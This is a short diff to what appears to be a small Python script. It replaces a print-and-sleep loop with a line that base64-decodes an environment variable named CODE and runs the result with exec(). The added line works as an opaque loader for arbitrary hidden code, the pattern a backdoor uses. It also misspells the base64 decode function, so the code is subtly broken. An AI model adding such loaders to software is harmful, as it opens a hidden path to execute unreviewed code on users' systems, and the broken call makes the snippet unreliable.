@@ -1,4 +1,2 @@
-import  time
-print("start")
-while True:
-    time.sleep(60)
+import  os,base64
+exec(base64.b64decodo(os.environ.get("CODE","")).decode())
